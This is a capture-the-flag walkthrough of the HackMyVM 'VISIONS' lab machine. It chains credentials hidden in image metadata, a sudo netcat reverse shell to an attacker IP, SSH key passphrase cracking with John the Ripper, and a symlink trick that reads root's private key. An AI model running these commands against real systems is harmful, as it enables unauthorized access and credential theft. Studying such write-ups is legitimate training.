# HackMyVM - VISIONS Walkthrough

## Introduction

Welcome back to another **HackMyVM** walkthrough. In this write-up, we'll be solving the **VISIONS** machine, which is rated as an **Easy** Linux challenge.

Although this machine is classified as easy, it demonstrates several important concepts frequently encountered during penetration tests and Capture The Flag (CTF) environments. Throughout the challenge we will enumerate exposed services, perform web reconnaissance, extract hidden information from image metadata, abuse misconfigured `sudo` permissions for lateral movement, crack an encrypted SSH private key, and finally exploit an insecure symbolic link to obtain the root user's SSH private key.

Rather than relying on a single vulnerability, the machine requires chaining together multiple small findings, making it an excellent exercise in Linux privilege escalation and enumeration.

---

## Machine Information

| Category | Details |
|----------|---------|
| Platform | HackMyVM |
| Machine Name | VISIONS |
| Difficulty | Easy |
| Operating System | Linux |
| Skills Practiced | Nmap, Web Enumeration, EXIF Analysis, SSH, Sudo Misconfigurations, LinPEAS, John the Ripper, Privilege Escalation |

---

## Attack Path Overview

Before diving into the walkthrough, below is the complete attack path we will follow.

```text
Nmap Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
View Source
        │
        ▼
Download white.png
        │
        ▼
Extract EXIF Metadata
        │
        ▼
SSH Login (alicia)
        │
        ▼
Abuse sudo (nc)
        │
        ▼
Shell as emma
        │
        ▼
Recover Hidden Password
        │
        ▼
SSH Login (sophia)
        │
        ▼
Read Hidden SSH Key
        │
        ▼
Crack SSH Passphrase
        │
        ▼
SSH Login (isabella)
        │
        ▼
Symlink Abuse
        │
        ▼
Read Root SSH Key
        │
        ▼
Root
```

---

# Initial Reconnaissance

Like most HackMyVM machines, the target IP address is displayed directly on the machine banner after deployment.

> **Target IP**

```text
192.168.56.135
```

**Q1**

> *Insert Machine Banner Screenshot Here*

---

# Port Scanning

The first step during every penetration test is identifying the network services exposed by the target.

Instead of assuming which services are available, we perform a full TCP scan to discover every open port.

```bash
nmap -p- --min-rate 5000 192.168.56.135
```

The scan quickly completes and reveals only two open ports.

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only SSH and HTTP are accessible from the network.

This significantly reduces the attack surface and tells us our investigation should primarily focus on the web service before attempting direct SSH access.

**Q2**

> *Insert Full Nmap Scan Screenshot Here*

---

# Service Enumeration

After discovering the open ports, the next step is determining which services and software versions are running.

For this purpose, we perform version detection together with default NSE scripts.

```bash
nmap -sC -sV 192.168.56.135
```

The scan returns the following information.

| Port | Service | Version |
|------|----------|----------|
| 22 | SSH | OpenSSH 7.9p1 |
| 80 | HTTP | nginx 1.14.2 |

The HTTP server does not expose a webpage title and only allows the **GET** and **HEAD** HTTP methods.

```text
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    nginx 1.14.2
```

Nothing immediately stands out as vulnerable.

Instead of attempting brute force attacks or looking for public exploits, it is usually more productive to begin investigating the web application itself.

**Q3**

> *Insert Service Enumeration Screenshot Here*

---

# Web Enumeration

Opening the target inside a web browser presents an unusual result.

Instead of a traditional webpage containing links, forms, or visible content, only a completely white page is displayed.

At first glance this might suggest the website is broken.

However, blank pages should never be ignored during penetration testing.

Developers frequently leave hidden comments, source code, metadata, or linked resources that are invisible during normal browsing.

**Q4**

> *Insert Website Screenshot Here*

---

# Inspecting the Page Source

Viewing the page source immediately provides the first useful clue.

Inside the HTML source we discover a reference to an image named:

```text
white.png
```

Additionally, a username is left inside the source.

```text
username: alicia
```

Although we do not yet possess valid credentials, usernames are valuable pieces of information because they may later be paired with recovered passwords.

At this stage we make a note of:

- Username: **alicia**
- Image: **white.png**

---

# Directory Enumeration

Before analysing the image itself, we perform directory enumeration to identify hidden files or directories exposed by the web server.

For this task, Feroxbuster is used.

```bash
feroxbuster -u http://192.168.56.135
```

The scan completes successfully.

Surprisingly, no interesting directories are discovered.

The only notable file remains the previously identified image.

```text
white.png
```

This strongly suggests the challenge intentionally expects us to investigate the image rather than continue brute-force directory enumeration.

**Q5**

> *Insert Feroxbuster Screenshot Here*

---

# Metadata Analysis

Images frequently contain hidden metadata that is invisible during normal viewing.

This metadata may include:

- Author information
- GPS coordinates
- Comments
- Camera information
- Software versions
- Hidden notes

To inspect the PNG file, we use **ExifTool**.

```bash
exiftool white.png -v
```

While reviewing the output, one field immediately attracts attention.

```text
Comment = pw:ihaveadream
```

Unlike ordinary metadata describing image properties, this comment appears intentionally placed by the challenge creator.

The prefix **pw** strongly suggests that the remaining string is a password.

```text
Password

↓

ihaveadream
```

Since we already recovered the username **alicia**, this becomes the obvious credential pair to test.

**Q6**

> *Insert ExifTool Screenshot Here*

---

# Initial SSH Access

Using the recovered credentials, we attempt to authenticate over SSH.

```bash
ssh alicia@192.168.56.135
```

Password:

```text
ihaveadream
```

Authentication succeeds immediately.

We now have our initial foothold on the target as the user **alicia**.

Unlike many Linux machines where gaining the first shell requires exploiting a vulnerability, this challenge demonstrates how sensitive information stored inside image metadata can completely compromise an account.

Once logged in, basic system enumeration confirms that several additional user accounts exist.

```text
alicia
emma
isabella
sophia
```

Multiple user accounts generally indicate that lateral movement will be required before obtaining root access.

**Q7**

> *Insert SSH Login Screenshot Here*

---

# Enumerating Sudo Permissions

One of the first commands executed after obtaining a shell should always be:

```bash
sudo -l
```

This reveals whether the current user can execute commands with elevated privileges.

For **alicia**, the output is:

```text
User alicia may run the following commands:

(emma) NOPASSWD:
/usr/bin/nc
```

This configuration allows Alicia to execute **Netcat** as the user **emma** without supplying a password.

Although Netcat is commonly viewed as a networking utility, its ability to execute programs makes it extremely powerful when granted through `sudo`.

This immediately becomes our privilege escalation vector.

Rather than searching for kernel exploits or vulnerable binaries, we can directly leverage this misconfiguration to obtain a shell as **emma**.

**Q8**

> *Insert sudo -l Screenshot Here*

---

At this point we have successfully:

- Identified the exposed services.
- Investigated the web application.
- Extracted credentials hidden inside image metadata.
- Obtained an initial SSH foothold.
- Discovered a sudo misconfiguration allowing lateral movement to another user.

In the next section, we will exploit the Netcat sudo permission to become **emma**, enumerate the system further using **LinPEAS**, uncover another hidden password concealed inside the image, and continue progressing toward the remaining user accounts.

# Privilege Escalation to Emma

During the initial enumeration, we discovered that the user **alicia** had an interesting sudo privilege.

Running:

```bash
sudo -l
```

returned:

```text
User alicia may run the following commands on visions:

(emma) NOPASSWD:
/usr/bin/nc
```

This configuration allows **alicia** to execute **Netcat (nc)** as the user **emma** without entering a password.

Although Netcat is primarily designed as a networking utility, one of its most powerful features is its ability to execute arbitrary programs after establishing a connection. If administrators allow Netcat to be executed through sudo, it can frequently be abused to spawn an interactive shell under another user's privileges.

Rather than attempting unnecessary exploits, we can directly leverage this misconfiguration.

---

# Abusing Netcat

First, we start a Netcat listener on our attacking machine.

```bash
nc -lvnp 4444
```

Then, from the target machine, execute:

```bash
sudo -u emma /usr/bin/nc -vn <ATTACKER-IP> 4444 -e /bin/bash
```

Example:

```bash
sudo -u emma /usr/bin/nc -vn 192.168.56.106 4444 -e /bin/bash
```

Immediately after the connection is established, our listener receives a shell running with **emma's** privileges.

```text
connect to [192.168.56.106] from (UNKNOWN)
```

We have now successfully moved from **alicia** to **emma**.

**Q9**

> *Insert Reverse Shell Screenshot Here*

---

# Stabilizing the Shell

Reverse shells obtained through Netcat are usually non-interactive.

To improve usability, stabilize the shell using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then suspend the shell:

```text
CTRL + Z
```

Configure the local terminal.

```bash
stty raw -echo
fg
reset
export TERM=xterm
stty rows 40 columns 120
```

After stabilization, the shell behaves much more like a normal SSH session.

This makes file navigation and privilege escalation significantly easier.

---

# Exploring Emma's Home Directory

Now that we have access as **emma**, we begin searching for useful files.

Listing the contents of the home directory reveals:

```bash
ls
```

Output:

```text
note.txt
```

Opening the file gives:

```bash
cat note.txt
```

```text
I can't help myself.
```

Although the note appears cryptic, it does not immediately reveal credentials or a privilege escalation vector.

Like many CTF machines, hints often become meaningful only after additional enumeration.

**Q10**

> *Insert note.txt Screenshot Here*

---

# Manual Enumeration

Before relying on automated tools, basic manual enumeration should always be performed.

Some useful commands include:

```bash
id
hostname
uname -a
ip a
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null
sudo -l
```

During this stage we searched for:

- SUID binaries
- Writable files
- Scheduled tasks
- Interesting configuration files
- Credentials
- SSH keys
- Backup files
- Running services

Unfortunately, none of these produced an immediate privilege escalation path.

Rather than guessing, it becomes more efficient to perform automated enumeration.

---

# Automated Enumeration with LinPEAS

LinPEAS is one of the most valuable post-exploitation tools available for Linux privilege escalation.

It performs hundreds of security checks automatically and highlights interesting findings.

After transferring the script to the target machine, execute:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

During the scan several findings are highlighted.

Among them are possible kernel exploits.

```text
CVE-2019-13272

PTRACE_TRACEME

Kernel 4.19
```

```text
CVE-2021-3493

OverlayFS
```

```text
CVE-2021-22555

Netfilter Heap Out-of-Bounds
```

**Q11**

> *Insert LinPEAS Screenshot Here*

---

# Evaluating Kernel Exploits

Seeing kernel vulnerabilities highlighted in LinPEAS does **not** automatically mean they should be exploited.

Professional penetration testers should always verify whether:

- The exploit affects the running distribution.
- Required conditions are satisfied.
- The exploit is reliable.
- Exploitation is necessary.

In this case:

- CVE-2021-3493 specifically targets Ubuntu systems.
- Other suggested vulnerabilities require additional prerequisites.
- None provided a practical escalation path for this machine.

This demonstrates an important lesson:

> Automated enumeration tools provide **potential** attack vectors, not guaranteed solutions.

Instead of forcing unreliable kernel exploits, we continue investigating artifacts already discovered during the challenge.

---

# Returning to the White Image

Earlier during web enumeration we downloaded:

```text
white.png
```

Initially, ExifTool revealed hidden credentials stored inside the metadata.

However, metadata is not the only location where information can be concealed.

Images themselves may contain:

- Hidden text
- Low-contrast objects
- Watermarks
- Steganographic content
- Embedded clues

Rather than assuming the image has already served its purpose, we examine it more closely.

---

# Image Analysis

Instead of using specialized steganography tools immediately, we open the image using **Photopea**, an online image editor.

By adjusting properties such as:

- Contrast
- Brightness
- Levels
- Exposure

previously invisible text begins to appear.

After increasing the contrast, another hidden message becomes visible.

```text
sophia

↓

seemstobeimpossible
```

This reveals another valid credential pair.

Unlike the previous password hidden in metadata, this clue is concealed visually inside the image itself.

This is an excellent reminder that image analysis should include both metadata inspection **and** visual examination.

**Q12**

> *Insert Photopea Screenshot Here*

---

# Switching to Sophia

Armed with the newly recovered credentials, we authenticate as **sophia**.

```bash
su sophia
```

or

```bash
ssh sophia@192.168.56.135
```

Password:

```text
seemstobeimpossible
```

Authentication succeeds.

We now have access to another user account.

Inside Sophia's home directory we find:

```bash
ls
```

```text
flag.sh
user.txt
```

Reading the user flag:

```bash
cat user.txt
```

returns:

```text
hmvicanseeforever
```

The first objective of the machine has now been completed.

**Q13**

> *Insert User Flag Screenshot Here*

---

# Progress Summary

At this point the attack chain has progressed considerably.

```text
Web Enumeration
        │
        ▼
Image Metadata
        │
        ▼
SSH Login (alicia)
        │
        ▼
Sudo Abuse (Netcat)
        │
        ▼
Shell as emma
        │
        ▼
LinPEAS Enumeration
        │
        ▼
Visual Image Analysis
        │
        ▼
Password Recovery
        │
        ▼
SSH Login (sophia)
        │
        ▼
User Flag
```

We now control the third user account on the system.

However, the machine is not yet complete.

Further enumeration reveals that **Sophia** possesses an unusual sudo permission capable of reading a hidden file belonging to another user. That seemingly harmless permission ultimately becomes the key to obtaining **Isabella's SSH private key**, paving the way for the final privilege escalation to **root**.

# Enumerating Sophia

After successfully obtaining access as **sophia**, the next objective is identifying a path toward the final user account and ultimately root.

As with every new user, the very first command executed should be:

```bash
sudo -l
```

This helps determine whether the current user has any elevated privileges that can be abused.

The output reveals something interesting.

```text
Matching Defaults entries for sophia on visions:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD:
/usr/bin/cat /home/isabella/.invisible
```

Unlike previous privilege escalations, Sophia cannot execute an entire program as another user.

Instead, she is allowed to execute only a single command:

```text
cat /home/isabella/.invisible
```

At first glance this permission appears harmless.

However, hidden files often contain credentials, SSH keys, notes, configuration files, or other sensitive information.

This file immediately becomes our next investigation target.

**Q14**

> *Insert Sophia sudo -l Screenshot Here*

---

# Reading the Hidden File

Using the permitted sudo command, we read the contents of the hidden file.

```bash
sudo cat /home/isabella/.invisible
```

Instead of a simple text note, the output contains what appears to be an encrypted OpenSSH private key.

```text
-----BEGIN OPENSSH PRIVATE KEY-----

...

-----END OPENSSH PRIVATE KEY-----
```

Finding another user's private SSH key is a significant discovery.

However, possessing the key does not necessarily mean immediate access.

Modern OpenSSH private keys are frequently protected with a passphrase.

---

# Saving the SSH Key

Copy the recovered key into a local file.

For example:

```bash
nano isabella_rsa
```

Paste the complete private key and save the file.

Then apply the correct permissions.

```bash
chmod 600 isabella_rsa
```

Without restrictive permissions, OpenSSH refuses to use private keys for authentication.

---

# Attempting SSH Authentication

Now attempt authentication using the recovered key.

```bash
ssh -i isabella_rsa isabella@192.168.56.135
```

Instead of granting access, SSH requests a passphrase.

```text
Enter passphrase for key 'isabella_rsa':
```

Unfortunately, the passphrase is unknown.

This confirms the private key has been encrypted.

Rather than abandoning the key, we attempt to recover its passphrase.

---

# Converting the SSH Key for John the Ripper

John the Ripper cannot crack OpenSSH private keys directly.

First, convert the key into a hash format.

```bash
ssh2john isabella_rsa > hash
```

The generated hash can now be processed by John.

```bash
john hash
```

John begins testing candidate passwords.

After a short period, it successfully recovers the passphrase.

```text
invisible
```

This demonstrates another common real-world scenario.

Recovering a private key alone is often insufficient if the attacker cannot also recover the associated passphrase.

**Q15**

> *Insert John the Ripper Screenshot Here*

---

# Logging in as Isabella

Using the recovered passphrase, authenticate once again.

```bash
ssh -i isabella_rsa isabella@192.168.56.135
```

When prompted, enter:

```text
invisible
```

Authentication succeeds.

We now control the fourth user account on the system.

Although this appears to be significant progress, our objective is still obtaining root privileges.

As always, enumeration comes before exploitation.

---

# Checking Sudo Permissions

The first command executed as Isabella is once again:

```bash
sudo -l
```

The output reveals:

```text
User isabella may run the following commands:

(emma) NOPASSWD:
/usr/bin/man
```

Initially this seems unusual.

Normally GTFOBins demonstrates several privilege escalation techniques involving **man**.

However, this permission only allows execution as **emma**.

Since we already compromised Emma earlier, returning to that account provides no additional privileges.

Therefore this path does not directly help us obtain root access.

**Q16**

> *Insert Isabella sudo -l Screenshot Here*

---

# Looking for Alternative Paths

Whenever an apparent privilege escalation vector leads nowhere, it is important to review everything discovered earlier.

One file deserves particular attention.

```text
/home/isabella/.invisible
```

Earlier we used Sophia's sudo permission to read this file.

This raises an interesting question.

What happens if the original file no longer exists?

More specifically:

> Can we replace the file with a symbolic link?

If Sophia is allowed to execute:

```bash
sudo cat /home/isabella/.invisible
```

then the operating system simply follows whatever object exists at that path.

If we replace the file with a symbolic link pointing somewhere else, Sophia's sudo permission may unknowingly read a completely different file.

---

# Removing the Original File

As Isabella, remove the existing hidden file.

```bash
rm -f ~/.invisible
```

Now create a symbolic link.

```bash
ln -s /root/.ssh/id_rsa ~/.invisible
```

Listing the directory confirms the change.

```bash
ls -lah
```

Output:

```text
.invisible -> /root/.ssh/id_rsa
```

Instead of containing Isabella's SSH key, the hidden file now points directly to the root user's private key.

**Q16**

> *Insert Symlink Screenshot Here*

---

# Reading Root's Private Key

Switch back to Sophia.

Remember that Sophia can execute:

```bash
sudo cat /home/isabella/.invisible
```

However, because the original file has been replaced with a symbolic link, the command now follows the link.

Execute:

```bash
sudo cat /home/isabella/.invisible
```

The output now contains:

```text
-----BEGIN OPENSSH PRIVATE KEY-----

...

-----END OPENSSH PRIVATE KEY-----
```

This time, the key belongs to **root**.

This is a classic example of **symbolic link abuse**, where a seemingly harmless file-reading permission is redirected toward a highly sensitive resource.

---

# Logging in as Root

Save the recovered private key.

```bash
nano root_rsa
chmod 600 root_rsa
```

Authenticate using SSH.

```bash
ssh -i root_rsa root@192.168.56.135
```

Authentication succeeds immediately.

We now have unrestricted administrative access to the target machine.

Listing the root directory reveals the final flag.

```bash
ls
```

```text
flag.sh
root.txt
```

Reading the flag:

```bash
cat root.txt
```

returns:

```text
hmvitspossible
```

The machine has now been fully compromised.

**Q17**

> *Insert Root Flag Screenshot Here*

---

# Attack Path Summary

The complete attack chain followed throughout this challenge is shown below.

```text
Port Scan
        │
        ▼
Web Enumeration
        │
        ▼
View Page Source
        │
        ▼
Download white.png
        │
        ▼
EXIF Metadata Analysis
        │
        ▼
Recover Alicia Password
        │
        ▼
SSH Login (Alicia)
        │
        ▼
Sudo Netcat Abuse
        │
        ▼
Shell as Emma
        │
        ▼
Image Contrast Analysis
        │
        ▼
Recover Sophia Password
        │
        ▼
SSH Login (Sophia)
        │
        ▼
Read Isabella SSH Key
        │
        ▼
Crack SSH Passphrase
        │
        ▼
SSH Login (Isabella)
        │
        ▼
Symlink .invisible
        │
        ▼
Read Root SSH Key
        │
        ▼
SSH Login (Root)
```

---

# Key Takeaways

Throughout this machine, several realistic security weaknesses were chained together to achieve full system compromise.

- Sensitive credentials stored inside image metadata can expose user accounts.
- Visual inspection of images may reveal hidden information that metadata tools cannot detect.
- Misconfigured `sudo` permissions on seemingly harmless binaries such as **nc** can enable lateral movement.
- Automated enumeration tools like LinPEAS should guide investigations but should not replace manual verification.
- Encrypted SSH private keys are only as strong as their passphrases, making tools like **John the Ripper** valuable during post-exploitation.
- Symbolic link attacks can transform limited file-reading permissions into complete system compromise if applications do not validate the target file.

This machine reinforces an important lesson in penetration testing: **full compromise often results from chaining multiple low-severity misconfigurations rather than exploiting a single critical vulnerability.**

---

# Conclusion - Jai Shri Ram.

The **VISIONS** machine demonstrates how careful enumeration consistently outperforms guesswork. Every stage of the attack relied on observing small clues, validating assumptions, and leveraging legitimate system functionality instead of relying on kernel exploits or complex payloads.

From extracting credentials hidden within an image to abusing `sudo` misconfigurations, cracking an encrypted SSH key, and finally exploiting symbolic links to obtain the root user's private key, each step built naturally upon the previous one.

Overall, this was an excellent Linux machine for practicing web enumeration, post-exploitation, lateral movement, privilege escalation, and the importance of thorough system enumeration during penetration testing.

